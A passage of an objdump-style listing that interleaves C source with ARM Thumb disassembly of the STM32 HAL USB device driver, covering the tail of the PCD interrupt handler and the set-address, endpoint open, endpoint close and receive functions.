 800204e:	2b00      	cmp	r3, #0
 8002050:	d003      	beq.n	800205a <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8002052:	6878      	ldr	r0, [r7, #4]
 8002054:	f000 fb59 	bl	800270a <PCD_EP_ISR_Handler>

    return;
 8002058:	e110      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 800205a:	68fb      	ldr	r3, [r7, #12]
 800205c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8002060:	2b00      	cmp	r3, #0
 8002062:	d013      	beq.n	800208c <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8002064:	687b      	ldr	r3, [r7, #4]
 8002066:	681b      	ldr	r3, [r3, #0]
 8002068:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800206c:	b29a      	uxth	r2, r3
 800206e:	687b      	ldr	r3, [r7, #4]
 8002070:	681b      	ldr	r3, [r3, #0]
 8002072:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8002076:	b292      	uxth	r2, r2
 8002078:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 800207c:	6878      	ldr	r0, [r7, #4]
 800207e:	f00a fd4c 	bl	800cb1a <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8002082:	2100      	movs	r1, #0
 8002084:	6878      	ldr	r0, [r7, #4]
 8002086:	f000 f8fc 	bl	8002282 <HAL_PCD_SetAddress>

    return;
 800208a:	e0f7      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 800208c:	68fb      	ldr	r3, [r7, #12]
 800208e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002092:	2b00      	cmp	r3, #0
 8002094:	d00c      	beq.n	80020b0 <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8002096:	687b      	ldr	r3, [r7, #4]
 8002098:	681b      	ldr	r3, [r3, #0]
 800209a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800209e:	b29a      	uxth	r2, r3
 80020a0:	687b      	ldr	r3, [r7, #4]
 80020a2:	681b      	ldr	r3, [r3, #0]
 80020a4:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 80020a8:	b292      	uxth	r2, r2
 80020aa:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 80020ae:	e0e5      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 80020b0:	68fb      	ldr	r3, [r7, #12]
 80020b2:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 80020b6:	2b00      	cmp	r3, #0
 80020b8:	d00c      	beq.n	80020d4 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 80020ba:	687b      	ldr	r3, [r7, #4]
 80020bc:	681b      	ldr	r3, [r3, #0]
 80020be:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80020c2:	b29a      	uxth	r2, r3
 80020c4:	687b      	ldr	r3, [r7, #4]
 80020c6:	681b      	ldr	r3, [r3, #0]
 80020c8:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 80020cc:	b292      	uxth	r2, r2
 80020ce:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 80020d2:	e0d3      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 80020d4:	68fb      	ldr	r3, [r7, #12]
 80020d6:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 80020da:	2b00      	cmp	r3, #0
 80020dc:	d034      	beq.n	8002148 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 80020de:	687b      	ldr	r3, [r7, #4]
 80020e0:	681b      	ldr	r3, [r3, #0]
 80020e2:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80020e6:	b29a      	uxth	r2, r3
 80020e8:	687b      	ldr	r3, [r7, #4]
 80020ea:	681b      	ldr	r3, [r3, #0]
 80020ec:	f022 0204 	bic.w	r2, r2, #4
 80020f0:	b292      	uxth	r2, r2
 80020f2:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 80020f6:	687b      	ldr	r3, [r7, #4]
 80020f8:	681b      	ldr	r3, [r3, #0]
 80020fa:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80020fe:	b29a      	uxth	r2, r3
 8002100:	687b      	ldr	r3, [r7, #4]
 8002102:	681b      	ldr	r3, [r3, #0]
 8002104:	f022 0208 	bic.w	r2, r2, #8
 8002108:	b292      	uxth	r2, r2
 800210a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 800210e:	687b      	ldr	r3, [r7, #4]
 8002110:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8002114:	2b01      	cmp	r3, #1
 8002116:	d107      	bne.n	8002128 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 8002118:	687b      	ldr	r3, [r7, #4]
 800211a:	2200      	movs	r2, #0
 800211c:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8002120:	2100      	movs	r1, #0
 8002122:	6878      	ldr	r0, [r7, #4]
 8002124:	f00a ffd6 	bl	800d0d4 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 8002128:	6878      	ldr	r0, [r7, #4]
 800212a:	f00a fd2f 	bl	800cb8c <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 800212e:	687b      	ldr	r3, [r7, #4]
 8002130:	681b      	ldr	r3, [r3, #0]
 8002132:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002136:	b29a      	uxth	r2, r3
 8002138:	687b      	ldr	r3, [r7, #4]
 800213a:	681b      	ldr	r3, [r3, #0]
 800213c:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8002140:	b292      	uxth	r2, r2
 8002142:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002146:	e099      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 8002148:	68fb      	ldr	r3, [r7, #12]
 800214a:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800214e:	2b00      	cmp	r3, #0
 8002150:	d027      	beq.n	80021a2 <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8002152:	687b      	ldr	r3, [r7, #4]
 8002154:	681b      	ldr	r3, [r3, #0]
 8002156:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800215a:	b29a      	uxth	r2, r3
 800215c:	687b      	ldr	r3, [r7, #4]
 800215e:	681b      	ldr	r3, [r3, #0]
 8002160:	f042 0208 	orr.w	r2, r2, #8
 8002164:	b292      	uxth	r2, r2
 8002166:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 800216a:	687b      	ldr	r3, [r7, #4]
 800216c:	681b      	ldr	r3, [r3, #0]
 800216e:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002172:	b29a      	uxth	r2, r3
 8002174:	687b      	ldr	r3, [r7, #4]
 8002176:	681b      	ldr	r3, [r3, #0]
 8002178:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 800217c:	b292      	uxth	r2, r2
 800217e:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8002182:	687b      	ldr	r3, [r7, #4]
 8002184:	681b      	ldr	r3, [r3, #0]
 8002186:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800218a:	b29a      	uxth	r2, r3
 800218c:	687b      	ldr	r3, [r7, #4]
 800218e:	681b      	ldr	r3, [r3, #0]
 8002190:	f042 0204 	orr.w	r2, r2, #4
 8002194:	b292      	uxth	r2, r2
 8002196:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 800219a:	6878      	ldr	r0, [r7, #4]
 800219c:	f00a fcdc 	bl	800cb58 <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 80021a0:	e06c      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 80021a2:	68fb      	ldr	r3, [r7, #12]
 80021a4:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80021a8:	2b00      	cmp	r3, #0
 80021aa:	d040      	beq.n	800222e <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 80021ac:	687b      	ldr	r3, [r7, #4]
 80021ae:	681b      	ldr	r3, [r3, #0]
 80021b0:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80021b4:	b29a      	uxth	r2, r3
 80021b6:	687b      	ldr	r3, [r7, #4]
 80021b8:	681b      	ldr	r3, [r3, #0]
 80021ba:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 80021be:	b292      	uxth	r2, r2
 80021c0:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 80021c4:	687b      	ldr	r3, [r7, #4]
 80021c6:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 80021ca:	2b00      	cmp	r3, #0
 80021cc:	d12b      	bne.n	8002226 <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 80021ce:	687b      	ldr	r3, [r7, #4]
 80021d0:	681b      	ldr	r3, [r3, #0]
 80021d2:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80021d6:	b29a      	uxth	r2, r3
 80021d8:	687b      	ldr	r3, [r7, #4]
 80021da:	681b      	ldr	r3, [r3, #0]
 80021dc:	f042 0204 	orr.w	r2, r2, #4
 80021e0:	b292      	uxth	r2, r2
 80021e2:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 80021e6:	687b      	ldr	r3, [r7, #4]
 80021e8:	681b      	ldr	r3, [r3, #0]
 80021ea:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80021ee:	b29a      	uxth	r2, r3
 80021f0:	687b      	ldr	r3, [r7, #4]
 80021f2:	681b      	ldr	r3, [r3, #0]
 80021f4:	f042 0208 	orr.w	r2, r2, #8
 80021f8:	b292      	uxth	r2, r2
 80021fa:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 80021fe:	687b      	ldr	r3, [r7, #4]
 8002200:	2201      	movs	r2, #1
 8002202:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 8002206:	687b      	ldr	r3, [r7, #4]
 8002208:	681b      	ldr	r3, [r3, #0]
 800220a:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 800220e:	b29b      	uxth	r3, r3
 8002210:	089b      	lsrs	r3, r3, #2
 8002212:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 8002216:	687b      	ldr	r3, [r7, #4]
 8002218:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 800221c:	2101      	movs	r1, #1
 800221e:	6878      	ldr	r0, [r7, #4]
 8002220:	f00a ff58 	bl	800d0d4 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 8002224:	e02a      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 8002226:	6878      	ldr	r0, [r7, #4]
 8002228:	f00a fc96 	bl	800cb58 <HAL_PCD_SuspendCallback>
    return;
 800222c:	e026      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 800222e:	68fb      	ldr	r3, [r7, #12]
 8002230:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8002234:	2b00      	cmp	r3, #0
 8002236:	d00f      	beq.n	8002258 <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 8002238:	687b      	ldr	r3, [r7, #4]
 800223a:	681b      	ldr	r3, [r3, #0]
 800223c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002240:	b29a      	uxth	r2, r3
 8002242:	687b      	ldr	r3, [r7, #4]
 8002244:	681b      	ldr	r3, [r3, #0]
 8002246:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 800224a:	b292      	uxth	r2, r2
 800224c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 8002250:	6878      	ldr	r0, [r7, #4]
 8002252:	f00a fc54 	bl	800cafe <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8002256:	e011      	b.n	800227c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 8002258:	68fb      	ldr	r3, [r7, #12]
 800225a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800225e:	2b00      	cmp	r3, #0
 8002260:	d00c      	beq.n	800227c <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 8002262:	687b      	ldr	r3, [r7, #4]
 8002264:	681b      	ldr	r3, [r3, #0]
 8002266:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800226a:	b29a      	uxth	r2, r3
 800226c:	687b      	ldr	r3, [r7, #4]
 800226e:	681b      	ldr	r3, [r3, #0]
 8002270:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 8002274:	b292      	uxth	r2, r2
 8002276:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 800227a:	bf00      	nop
  }
}
 800227c:	3710      	adds	r7, #16
 800227e:	46bd      	mov	sp, r7
 8002280:	bd80      	pop	{r7, pc}

08002282 <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 8002282:	b580      	push	{r7, lr}
 8002284:	b082      	sub	sp, #8
 8002286:	af00      	add	r7, sp, #0
 8002288:	6078      	str	r0, [r7, #4]
 800228a:	460b      	mov	r3, r1
 800228c:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 800228e:	687b      	ldr	r3, [r7, #4]
 8002290:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002294:	2b01      	cmp	r3, #1
 8002296:	d101      	bne.n	800229c <HAL_PCD_SetAddress+0x1a>
 8002298:	2302      	movs	r3, #2
 800229a:	e013      	b.n	80022c4 <HAL_PCD_SetAddress+0x42>
 800229c:	687b      	ldr	r3, [r7, #4]
 800229e:	2201      	movs	r2, #1
 80022a0:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 80022a4:	687b      	ldr	r3, [r7, #4]
 80022a6:	78fa      	ldrb	r2, [r7, #3]
 80022a8:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 80022ac:	687b      	ldr	r3, [r7, #4]
 80022ae:	681b      	ldr	r3, [r3, #0]
 80022b0:	78fa      	ldrb	r2, [r7, #3]
 80022b2:	4611      	mov	r1, r2
 80022b4:	4618      	mov	r0, r3
 80022b6:	f006 f94a 	bl	800854e <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 80022ba:	687b      	ldr	r3, [r7, #4]
 80022bc:	2200      	movs	r2, #0
 80022be:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80022c2:	2300      	movs	r3, #0
}
 80022c4:	4618      	mov	r0, r3
 80022c6:	3708      	adds	r7, #8
 80022c8:	46bd      	mov	sp, r7
 80022ca:	bd80      	pop	{r7, pc}

080022cc <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 80022cc:	b580      	push	{r7, lr}
 80022ce:	b084      	sub	sp, #16
 80022d0:	af00      	add	r7, sp, #0
 80022d2:	6078      	str	r0, [r7, #4]
 80022d4:	4608      	mov	r0, r1
 80022d6:	4611      	mov	r1, r2
 80022d8:	461a      	mov	r2, r3
 80022da:	4603      	mov	r3, r0
 80022dc:	70fb      	strb	r3, [r7, #3]
 80022de:	460b      	mov	r3, r1
 80022e0:	803b      	strh	r3, [r7, #0]
 80022e2:	4613      	mov	r3, r2
 80022e4:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 80022e6:	2300      	movs	r3, #0
 80022e8:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80022ea:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80022ee:	2b00      	cmp	r3, #0
 80022f0:	da0e      	bge.n	8002310 <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80022f2:	78fb      	ldrb	r3, [r7, #3]
 80022f4:	f003 0307 	and.w	r3, r3, #7
 80022f8:	1c5a      	adds	r2, r3, #1
 80022fa:	4613      	mov	r3, r2
 80022fc:	009b      	lsls	r3, r3, #2
 80022fe:	4413      	add	r3, r2
 8002300:	00db      	lsls	r3, r3, #3
 8002302:	687a      	ldr	r2, [r7, #4]
 8002304:	4413      	add	r3, r2
 8002306:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002308:	68fb      	ldr	r3, [r7, #12]
 800230a:	2201      	movs	r2, #1
 800230c:	705a      	strb	r2, [r3, #1]
 800230e:	e00e      	b.n	800232e <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002310:	78fb      	ldrb	r3, [r7, #3]
 8002312:	f003 0207 	and.w	r2, r3, #7
 8002316:	4613      	mov	r3, r2
 8002318:	009b      	lsls	r3, r3, #2
 800231a:	4413      	add	r3, r2
 800231c:	00db      	lsls	r3, r3, #3
 800231e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002322:	687a      	ldr	r2, [r7, #4]
 8002324:	4413      	add	r3, r2
 8002326:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002328:	68fb      	ldr	r3, [r7, #12]
 800232a:	2200      	movs	r2, #0
 800232c:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 800232e:	78fb      	ldrb	r3, [r7, #3]
 8002330:	f003 0307 	and.w	r3, r3, #7
 8002334:	b2da      	uxtb	r2, r3
 8002336:	68fb      	ldr	r3, [r7, #12]
 8002338:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 800233a:	883a      	ldrh	r2, [r7, #0]
 800233c:	68fb      	ldr	r3, [r7, #12]
 800233e:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 8002340:	68fb      	ldr	r3, [r7, #12]
 8002342:	78ba      	ldrb	r2, [r7, #2]
 8002344:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 8002346:	78bb      	ldrb	r3, [r7, #2]
 8002348:	2b02      	cmp	r3, #2
 800234a:	d102      	bne.n	8002352 <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 800234c:	68fb      	ldr	r3, [r7, #12]
 800234e:	2200      	movs	r2, #0
 8002350:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 8002352:	687b      	ldr	r3, [r7, #4]
 8002354:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002358:	2b01      	cmp	r3, #1
 800235a:	d101      	bne.n	8002360 <HAL_PCD_EP_Open+0x94>
 800235c:	2302      	movs	r3, #2
 800235e:	e00e      	b.n	800237e <HAL_PCD_EP_Open+0xb2>
 8002360:	687b      	ldr	r3, [r7, #4]
 8002362:	2201      	movs	r2, #1
 8002364:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 8002368:	687b      	ldr	r3, [r7, #4]
 800236a:	681b      	ldr	r3, [r3, #0]
 800236c:	68f9      	ldr	r1, [r7, #12]
 800236e:	4618      	mov	r0, r3
 8002370:	f003 fe8c 	bl	800608c <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002374:	687b      	ldr	r3, [r7, #4]
 8002376:	2200      	movs	r2, #0
 8002378:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 800237c:	7afb      	ldrb	r3, [r7, #11]
}
 800237e:	4618      	mov	r0, r3
 8002380:	3710      	adds	r7, #16
 8002382:	46bd      	mov	sp, r7
 8002384:	bd80      	pop	{r7, pc}

08002386 <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002386:	b580      	push	{r7, lr}
 8002388:	b084      	sub	sp, #16
 800238a:	af00      	add	r7, sp, #0
 800238c:	6078      	str	r0, [r7, #4]
 800238e:	460b      	mov	r3, r1
 8002390:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 8002392:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002396:	2b00      	cmp	r3, #0
 8002398:	da0e      	bge.n	80023b8 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800239a:	78fb      	ldrb	r3, [r7, #3]
 800239c:	f003 0307 	and.w	r3, r3, #7
 80023a0:	1c5a      	adds	r2, r3, #1
 80023a2:	4613      	mov	r3, r2
 80023a4:	009b      	lsls	r3, r3, #2
 80023a6:	4413      	add	r3, r2
 80023a8:	00db      	lsls	r3, r3, #3
 80023aa:	687a      	ldr	r2, [r7, #4]
 80023ac:	4413      	add	r3, r2
 80023ae:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80023b0:	68fb      	ldr	r3, [r7, #12]
 80023b2:	2201      	movs	r2, #1
 80023b4:	705a      	strb	r2, [r3, #1]
 80023b6:	e00e      	b.n	80023d6 <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80023b8:	78fb      	ldrb	r3, [r7, #3]
 80023ba:	f003 0207 	and.w	r2, r3, #7
 80023be:	4613      	mov	r3, r2
 80023c0:	009b      	lsls	r3, r3, #2
 80023c2:	4413      	add	r3, r2
 80023c4:	00db      	lsls	r3, r3, #3
 80023c6:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023ca:	687a      	ldr	r2, [r7, #4]
 80023cc:	4413      	add	r3, r2
 80023ce:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023d0:	68fb      	ldr	r3, [r7, #12]
 80023d2:	2200      	movs	r2, #0
 80023d4:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 80023d6:	78fb      	ldrb	r3, [r7, #3]
 80023d8:	f003 0307 	and.w	r3, r3, #7
 80023dc:	b2da      	uxtb	r2, r3
 80023de:	68fb      	ldr	r3, [r7, #12]
 80023e0:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80023e2:	687b      	ldr	r3, [r7, #4]
 80023e4:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80023e8:	2b01      	cmp	r3, #1
 80023ea:	d101      	bne.n	80023f0 <HAL_PCD_EP_Close+0x6a>
 80023ec:	2302      	movs	r3, #2
 80023ee:	e00e      	b.n	800240e <HAL_PCD_EP_Close+0x88>
 80023f0:	687b      	ldr	r3, [r7, #4]
 80023f2:	2201      	movs	r2, #1
 80023f4:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 80023f8:	687b      	ldr	r3, [r7, #4]
 80023fa:	681b      	ldr	r3, [r3, #0]
 80023fc:	68f9      	ldr	r1, [r7, #12]
 80023fe:	4618      	mov	r0, r3
 8002400:	f004 fa08 	bl	8006814 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002404:	687b      	ldr	r3, [r7, #4]
 8002406:	2200      	movs	r2, #0
 8002408:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 800240c:	2300      	movs	r3, #0
}
 800240e:	4618      	mov	r0, r3
 8002410:	3710      	adds	r7, #16
 8002412:	46bd      	mov	sp, r7
 8002414:	bd80      	pop	{r7, pc}

08002416 <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 8002416:	b580      	push	{r7, lr}
 8002418:	b086      	sub	sp, #24
 800241a:	af00      	add	r7, sp, #0
 800241c:	60f8      	str	r0, [r7, #12]
 800241e:	607a      	str	r2, [r7, #4]
 8002420:	603b      	str	r3, [r7, #0]
 8002422:	460b      	mov	r3, r1
 8002424:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002426:	7afb      	ldrb	r3, [r7, #11]
 8002428:	f003 0207 	and.w	r2, r3, #7
 800242c:	4613      	mov	r3, r2
 800242e:	009b      	lsls	r3, r3, #2
 8002430:	4413      	add	r3, r2
 8002432:	00db      	lsls	r3, r3, #3
 8002434:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002438:	68fa      	ldr	r2, [r7, #12]
 800243a:	4413      	add	r3, r2
 800243c:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800243e:	697b      	ldr	r3, [r7, #20]
 8002440:	687a      	ldr	r2, [r7, #4]
 8002442:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002444:	697b      	ldr	r3, [r7, #20]
 8002446:	683a      	ldr	r2, [r7, #0]
 8002448:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 800244a:	697b      	ldr	r3, [r7, #20]
 800244c:	2200      	movs	r2, #0
 800244e:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 8002450:	697b      	ldr	r3, [r7, #20]
 8002452:	2200      	movs	r2, #0
 8002454:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002456:	7afb      	ldrb	r3, [r7, #11]
